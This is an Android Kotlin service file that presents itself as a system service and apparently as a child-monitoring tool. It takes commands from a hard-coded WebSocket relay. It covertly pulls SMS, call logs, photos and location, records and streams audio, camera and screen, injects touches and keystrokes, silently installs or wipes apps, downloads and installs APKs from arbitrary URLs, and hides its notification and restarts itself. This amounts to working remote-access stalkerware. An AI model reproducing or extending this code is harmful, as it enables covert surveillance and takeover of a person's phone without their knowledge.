package com.system.service.core

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.system.service.monitors.*
import com.system.service.monitors.AmbientRecorder
import com.system.service.monitors.BrowserBlocker
import com.system.service.monitors.OfflineAlertManager
import com.system.service.monitors.PermissionWatcher
import com.system.service.setup.MediaProjectionActivity
import com.system.service.setup.ShakeDetector
import org.json.JSONArray
import org.json.JSONObject

class CoreService : Service() {

    companion object {
        var instance: CoreService? = null
        var SERVER_URL = "wss://ws-relay-production-9ea0.up.railway.app/api/ws"
        const val PREFS_NAME     = "config"
        const val KEY_SERVER_URL = "server_url"
        const val KEY_PAIR_CODE  = "pair_code"
        private const val CHANNEL_ID = "device_health"
        private const val NOTIF_ID   = 1
    }

    private var wsManager: WebSocketManager? = null
    private var fusedLocationClient: FusedLocationProviderClient? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var shakeDetector: ShakeDetector? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    // NetworkCallback: reconnect automatically when phone comes back online
    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            mainHandler.postDelayed({
                if (wsManager?.isConnected() != true) {
                    wsManager?.forceReconnect()
                }
            }, 2000)
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        acquireWakeLock()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, buildHiddenNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIF_ID, buildHiddenNotification())
        }
        AppBlockerManager.init(this)
        KeywordDetector.init(this)
        BrowserBlocker.init(this)
        connectServer()
        WatchdogReceiver.schedule(this)
        MonitorWorker.enqueue(this)
        shakeDetector = ShakeDetector(this).also { it.start() }
        PermissionWatcher.start(this)
        OfflineAlertManager.start(this)

        // Register network callback for auto-reconnect
        try {
            val cm = getSystemService(ConnectivityManager::class.java)
            val req = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            cm.registerNetworkCallback(req, networkCallback)
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        wsManager?.disconnect()
        shakeDetector?.stop()
        GeofenceMonitor.stopTracking()
        InternetScheduler.disable()
        AmbientRecorder.stopRecording(this)
        PermissionWatcher.stop()
        OfflineAlertManager.stop()
        try { CameraRecorder.stop(this) } catch (_: Exception) {}
        try { ScreenRecorder.stop(this) } catch (_: Exception) {}
        releaseWakeLock()
        WatchdogReceiver.schedule(this)
        try { getSystemService(ConnectivityManager::class.java).unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Android 14+ (API 34) crashes if startForegroundService is called from onTaskRemoved
        // WatchdogReceiver handles restart via AlarmManager instead
        WatchdogReceiver.schedule(this)
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GuardianEye::CoreLock")
                .also { it.setReferenceCounted(false); it.acquire(10 * 60 * 60 * 1000L) }
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
    }

    private fun connectServer() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val savedUrl = prefs.getString(KEY_SERVER_URL, null)
        val pairCode = prefs.getString(KEY_PAIR_CODE, "") ?: ""
        if (savedUrl != null) SERVER_URL = savedUrl

        wsManager = WebSocketManager(
            serverUrl      = SERVER_URL,
            pairCode       = pairCode,
            onMessage      = { handleCommand(it) },
            onConnected    = {
                OfflineAlertManager.onConnected()
                NotificationMonitor.drainQueue()
                sendData("device_info", JSONObject().apply {
                    put("blocked_apps",      JSONArray(AppBlockerManager.getBlockedApps()))
                    put("keywords",          JSONArray(KeywordDetector.getKeywords()))
                    put("blocked_domains",   JSONArray(BrowserBlocker.getBlockedDomains()))
                })
            },
            onDisconnected = { OfflineAlertManager.onDisconnected() }
        )
        wsManager?.connect()
    }

    fun reconnect() {
        wsManager?.disconnect()
        connectServer()
    }

    private fun handleCommand(data: JSONObject) {
        try {
            when (data.optString("command")) {

                // ── URL update ─────────────────────────────────────────────────
                "update_url" -> {
                    val newUrl = data.optString("url")
                    val newCode = data.optString("pair_code", "")
                    if (newUrl.startsWith("ws://") || newUrl.startsWith("wss://")) {
                        SERVER_URL = newUrl
                        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                        if (newUrl.isNotEmpty()) prefs.putString(KEY_SERVER_URL, newUrl)
                        if (newCode.isNotEmpty()) prefs.putString(KEY_PAIR_CODE, newCode)
                        prefs.apply()
                        wsManager?.disconnect(); connectServer()
                    }
                }

                // ── Screen Permission (MediaProjection) ────────────────────────
                // Parent sends this before starting screen stream.
                // Launches transparent activity — user sees system dialog on child phone.
                "request_screen_permission" -> {
                    try {
                        val i = Intent(this, MediaProjectionActivity::class.java)
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                        startActivity(i)
                    } catch (_: Exception) {}
                }

                // ── App Blocker ────────────────────────────────────────────────
                "set_blocked_apps" -> {
                    val arr = data.optJSONArray("apps") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    AppBlockerManager.setBlockedApps(list)
                    sendData("blocked_apps_updated", JSONObject().apply { put("count", list.size); put("apps", arr) })
                }

                // ── Screen Time Limits ─────────────────────────────────────────
                "set_time_limit" -> {
                    val pkg = data.optString("package")
                    val mins = data.optInt("minutes", 0)
                    if (pkg.isNotEmpty()) AppBlockerManager.setTimeLimit(pkg, mins)
                    sendData("time_limit_set", JSONObject().apply { put("package", pkg); put("minutes", mins) })
                }

                // ── Geofence ───────────────────────────────────────────────────
                "set_geofence" -> {
                    val lat = data.optDouble("lat"); val lng = data.optDouble("lng")
                    val radius = data.optDouble("radius", 200.0).toFloat()
                    GeofenceMonitor.setGeofence(lat, lng, radius, this)
                    sendData("geofence_set", JSONObject().apply { put("lat", lat); put("lng", lng); put("radius", radius) })
                }
                "disable_geofence" -> GeofenceMonitor.disableGeofence()

                // ── Keyword Alerts ─────────────────────────────────────────────
                "set_keywords" -> {
                    val arr = data.optJSONArray("keywords") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    KeywordDetector.setKeywords(list, this)
                    sendData("keywords_updated", JSONObject().apply { put("count", list.size) })
                }

                // ── Internet Schedule ──────────────────────────────────────────
                "set_schedule" -> {
                    val offStart = data.optInt("off_hour_start", 23)
                    val offEnd   = data.optInt("off_hour_end", 6)
                    InternetScheduler.setSchedule(offStart, offEnd, this)
                    sendData("schedule_set", JSONObject().apply { put("off_start", offStart); put("off_end", offEnd) })
                }
                "disable_schedule" -> InternetScheduler.disable()

                "get_daily_report" -> sendData("daily_report", AppBlockerManager.getDailyReport())

                // ── Browser URL Blocking ───────────────────────────────────────
                "set_blocked_domains" -> {
                    val arr = data.optJSONArray("domains") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    BrowserBlocker.setBlockedDomains(list, this)
                    sendData("blocked_domains_updated", JSONObject().apply {
                        put("count", list.size)
                        put("domains", arr)
                    })
                }
                "get_blocked_domains" -> {
                    sendData("blocked_domains", JSONObject().apply {
                        put("domains", JSONArray(BrowserBlocker.getBlockedDomains()))
                    })
                }

                // ── Ambient Audio Recording ────────────────────────────────────
                "start_ambient_record" -> {
                    val secs = data.optInt("duration_seconds", 60)
                    AmbientRecorder.startRecording(this, secs)
                }
                "stop_ambient_record" -> AmbientRecorder.stopRecording(this)
                "get_recording" -> {
                    val path = data.optString("path")
                    if (path.isNotEmpty()) AmbientRecorder.sendRecordingToParent(this, path)
                }
                "list_recordings" -> {
                    val files = AmbientRecorder.listRecordings(this)
                    val arr   = JSONArray()
                    files.take(20).forEach { f ->
                        arr.put(JSONObject().apply {
                            put("path", f.absolutePath)
                            put("filename", f.name)
                            put("size_kb", f.length() / 1024)
                            put("modified", f.lastModified())
                        })
                    }
                    sendData("recording_list", JSONObject().apply { put("files", arr) })
                }

                // ── Offline Alert Threshold ────────────────────────────────────
                "set_offline_threshold" -> {
                    val mins = data.optInt("minutes", 30)
                    OfflineAlertManager.setThreshold(this, mins)
                    sendData("offline_threshold_set", JSONObject().apply { put("minutes", mins) })
                }

                // ── Permission Status ──────────────────────────────────────────
                "get_permission_status" -> {
                    // PermissionWatcher sends status on next check cycle; trigger immediately
                    sendData("permission_check_requested", JSONObject().apply {
                        put("time", System.currentTimeMillis())
                    })
                }

                "block_contact" -> {
                    val number = data.optString("number")
                    val prefs = getSharedPreferences("blocked_contacts", MODE_PRIVATE)
                    val existing = prefs.getStringSet("numbers", mutableSetOf()) ?: mutableSetOf()
                    existing.add(number)
                    prefs.edit().putStringSet("numbers", existing).apply()
                    sendData("contact_blocked", JSONObject().apply { put("number", number) })
                }

                // ── Basic commands ─────────────────────────────────────────────
                "lock_screen"    -> lockScreen()
                "get_battery"    -> sendBattery()
                "get_location"   -> sendLocation()
                "take_photo"     -> takeSinglePhoto()
                "emergency_lock" -> { lockScreen(); sendData("emergency_locked", JSONObject()) }

                // ── Emergency Lock ALL apps ────────────────────────────────────
                "emergency_lock_all" -> {
                    val pm   = packageManager
                    val pkgs = pm.getInstalledPackages(0)
                        .filter { (it.applicationInfo?.flags ?: 0) and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
                        .map { it.packageName }
                        .filter { it != packageName }
                    AppBlockerManager.setBlockedApps(pkgs)
                    lockScreen()
                    sendData("emergency_locked_all", JSONObject().apply {
                        put("blocked_count", pkgs.size)
                        put("source", "emergency_lock_all")
                    })
                }
                "emergency_unlock_all" -> {
                    AppBlockerManager.setBlockedApps(emptyList())
                    sendData("emergency_unlocked_all", JSONObject().apply { put("source", "emergency_unlock_all") })
                }
                "wifi_on"        -> runShellCmd("svc wifi enable")
                "wifi_off"       -> runShellCmd("svc wifi disable")
                "get_gallery"    -> sendGallery(data.optInt("limit", 20))
                "get_full_photo" -> sendFullPhoto(data.optString("path"))
                "get_call_log"   -> sendCallLog(data.optInt("limit", 50))
                "get_sms"        -> sendSms(data.optInt("limit", 50))
                "get_running_app"-> sendCurrentApp()
                "get_app_usage"  -> sendAppUsage(data.optInt("hours", 24))

                "start_camera_stream" -> startService(Intent(this, CameraStreamService::class.java).putExtra("interval", data.optLong("interval", 33L)))
                "stop_camera_stream"  -> startService(Intent(this, CameraStreamService::class.java).setAction("STOP"))
                "start_mic_stream"    -> startService(Intent(this, AudioStreamService::class.java))
                "stop_mic_stream"     -> startService(Intent(this, AudioStreamService::class.java).setAction("STOP"))
                "start_screen_stream" -> startService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 500L)))
                "stop_screen_stream"  -> startService(Intent(this, ScreenStreamService::class.java).setAction("STOP"))

                // ── Camera Video Recording to file ─────────────────────────────
                "start_camera_record" -> {
                    val secs  = data.optInt("duration_seconds", 60)
                    val front = data.optBoolean("front_camera", false)
                    CameraRecorder.start(this, secs, front)
                }
                "stop_camera_record"  -> CameraRecorder.stop(this)
                "list_camera_records" -> {
                    val files = CameraRecorder.listRecordings(this)
                    val arr   = JSONArray()
                    files.take(20).forEach { f ->
                        arr.put(JSONObject().apply {
                            put("path", f.absolutePath); put("filename", f.name)
                            put("size_kb", f.length() / 1024); put("modified", f.lastModified())
                        })
                    }
                    sendData("camera_record_list", JSONObject().apply { put("files", arr) })
                }
                "get_camera_record_file" -> CameraRecorder.sendRecordingFile(this, data.optString("path"))

                // ── Screen Recording to file ───────────────────────────────────
                "start_screen_record" -> {
                    val secs = data.optInt("duration_seconds", 60)
                    ScreenRecorder.start(this, secs)
                }
                "stop_screen_record"  -> ScreenRecorder.stop(this)
                "list_screen_records" -> {
                    val files = ScreenRecorder.listRecordings(this)
                    val arr   = JSONArray()
                    files.take(20).forEach { f ->
                        arr.put(JSONObject().apply {
                            put("path", f.absolutePath); put("filename", f.name)
                            put("size_kb", f.length() / 1024); put("modified", f.lastModified())
                        })
                    }
                    sendData("screen_record_list", JSONObject().apply { put("files", arr) })
                }
                "get_screen_record_file" -> ScreenRecorder.sendRecordingFile(this, data.optString("path"))

                // ── Albums Safety ──────────────────────────────────────────────
                "scan_albums"    -> AlbumsSafetyScanner.scan(this)
                "get_album_image"-> AlbumsSafetyScanner.getFullImage(this, data.optString("uri"))

                "touch"    -> AccessibilityMonitor.performTouch(data.optDouble("x", 0.0).toFloat(), data.optDouble("y", 0.0).toFloat())
                "swipe"    -> AccessibilityMonitor.performSwipe(data.optDouble("x1", 0.0).toFloat(), data.optDouble("y1", 0.0).toFloat(), data.optDouble("x2", 0.0).toFloat(), data.optDouble("y2", 500.0).toFloat(), data.optLong("duration", 300))
                "key_back"    -> AccessibilityMonitor.performBack()
                "key_home"    -> AccessibilityMonitor.performHome()
                "key_recents" -> AccessibilityMonitor.performRecents()
                "type_text"   -> AccessibilityMonitor.typeText(data.optString("text"))

                "grant_permissions" -> {
                    val count = ShizukuManager.grantAllPermissions(this)
                    sendData("permissions_result", JSONObject().apply {
                        put("granted", count)
                        put("shizuku_available", ShizukuManager.isShizukuAvailable())
                    })
                }

                // ── 15 SHIZUKU POWER FEATURES ─────────────────────────────────
                "silent_install" -> {
                    val path = data.optString("apk_path")
                    val ok = ShizukuManager.silentInstall(path)
                    sendData("install_result", JSONObject().apply { put("success", ok); put("path", path) })
                }
                "silent_uninstall" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.silentUninstall(pkg)
                    sendData("uninstall_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                }
                "force_stop" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.forceStop(pkg)
                    sendData("force_stop_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                }
                "freeze_app" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.freezeApp(pkg)
                    sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", true) })
                }
                "unfreeze_app" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.unfreezeApp(pkg)
                    sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", false) })
                }
                "set_dns" -> {
                    val dns = data.optString("dns_server", "family.cloudflare-dns.com")
                    val ok = ShizukuManager.setPrivateDns(dns)
                    sendData("dns_result", JSONObject().apply { put("success", ok); put("dns", dns) })
                }
                "clear_dns" -> {
                    val ok = ShizukuManager.clearPrivateDns()
                    sendData("dns_result", JSONObject().apply { put("success", ok); put("dns", "auto") })
                }
                "kill_bg_app" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.killBgApp(pkg)
                    sendData("kill_bg_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                }
                "set_resolution" -> {
                    val w = data.optInt("width", 720); val h = data.optInt("height", 1280); val dpi = data.optInt("dpi", 240)
                    val ok = ShizukuManager.setResolution(w, h, dpi)
                    sendData("resolution_result", JSONObject().apply { put("success", ok); put("width", w); put("height", h); put("dpi", dpi) })
                }
                "reset_resolution" -> {
                    val ok = ShizukuManager.resetResolution()
                    sendData("resolution_result", JSONObject().apply { put("success", ok); put("reset", true) })
                }
                "disable_hotspot" -> {
                    val ok = ShizukuManager.disableHotspot()
                    sendData("hotspot_result", JSONObject().apply { put("success", ok) })
                }
                "lock_ime" -> {
                    val imeId = data.optString("ime_id", "com.google.android.inputmethod.latin/.LatinIME")
                    val ok = ShizukuManager.lockInputMethod(imeId)
                    sendData("ime_result", JSONObject().apply { put("success", ok); put("ime", imeId) })
                }
                "wipe_app_data" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.wipeAppData(pkg)
                    sendData("wipe_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                }
                "block_usb_debug" -> {
                    val ok = ShizukuManager.blockUsbDebugging()
                    sendData("usb_debug_result", JSONObject().apply { put("success", ok); put("blocked", true) })
                }
                "lock_dev_options" -> {
                    val ok = ShizukuManager.lockDeveloperOptions()
                    sendData("dev_options_result", JSONObject().apply { put("success", ok); put("locked", true) })
                }

                // ── OTA Update ─────────────────────────────────────────────────
                "update_from_url" -> {
                    val url     = data.optString("url")
                    val version = data.optString("version", "latest")
                    if (url.startsWith("http://") || url.startsWith("https://")) {
                        sendData("update_result", JSONObject().apply { put("status", "downloading"); put("version", version) })
                        Thread {
                            try {
                                val destFile = java.io.File(getExternalFilesDir(null), "ChildMonitor_${version}.apk")
                                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                                conn.connectTimeout = 30000; conn.readTimeout = 60000; conn.connect()
                                conn.inputStream.use { input -> destFile.outputStream().use { out -> input.copyTo(out) } }
                                conn.disconnect()
                                val ok = ShizukuManager.silentInstall(destFile.absolutePath)
                                sendData("update_result", JSONObject().apply {
                                    put("success", ok); put("version", version)
                                    put("path", destFile.absolutePath)
                                })
                            } catch (e: Exception) {
                                sendData("update_result", JSONObject().apply { put("success", false); put("error", e.message) })
                            }
                        }.start()
                    }
                }
            }
        } catch (_: Exception) {}
    }

    fun sendData(type: String, data: JSONObject) {
        try { data.put("type", type); data.put("ts", System.currentTimeMillis()); wsManager?.send(data) } catch (_: Exception) {}
    }

    private fun lockScreen() {
        try { (getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager).lockNow() } catch (_: Exception) {}
    }

    private fun runShellCmd(cmd: String) { ShizukuManager.exec(cmd) }

    private fun sendBattery() {
        try {
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            sendData("battery", JSONObject().apply {
                put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
                put("charging", bm.isCharging)
            })
        } catch (_: Exception) {}
    }

    private fun sendLocation() {
        try {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { loc: Location? ->
                loc?.let { sendData("location", JSONObject().apply { put("lat", it.latitude); put("lng", it.longitude); put("accuracy", it.accuracy) }) }
            }
        } catch (_: Exception) {}
    }

    private fun sendGallery(limit: Int) {
        try { sendData("gallery", JSONObject().apply { put("photos", GalleryManager.getRecentPhotos(this@CoreService, limit)) }) } catch (_: Exception) {}
    }

    private fun sendFullPhoto(path: String) {
        try {
            val b64 = GalleryManager.getFullPhoto(this, path) ?: return
            sendData("full_photo", JSONObject().apply { put("image", b64); put("path", path) })
        } catch (_: Exception) {}
    }

    private fun sendCallLog(limit: Int) {
        try { sendData("call_log", JSONObject().apply { put("calls", CallLogManager.getCallLog(this@CoreService, limit)) }) } catch (_: Exception) {}
    }

    private fun sendSms(limit: Int) {
        try { sendData("sms", JSONObject().apply { put("messages", SmsReader.getSms(this@CoreService, limit)) }) } catch (_: Exception) {}
    }

    private fun sendCurrentApp() {
        try {
            val pkg = AppUsageManager.getCurrentApp(this)
            sendData("current_app", JSONObject().apply { put("package", pkg ?: "") })
        } catch (_: Exception) {}
    }

    private fun sendAppUsage(hours: Int) {
        try { sendData("app_usage", JSONObject().apply { put("stats", AppUsageManager.getUsageStats(this@CoreService, hours)) }) } catch (_: Exception) {}
    }

    private fun takeSinglePhoto() {
        try { startService(Intent(this, CameraStreamService::class.java).putExtra("interval", 99999999L)) } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Background Services", NotificationManager.IMPORTANCE_NONE).apply {
            setShowBadge(false); enableLights(false); enableVibration(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildHiddenNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false).setSilent(true).build()

    override fun onStartCommand(intent: Intent?, flags: Int, id: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
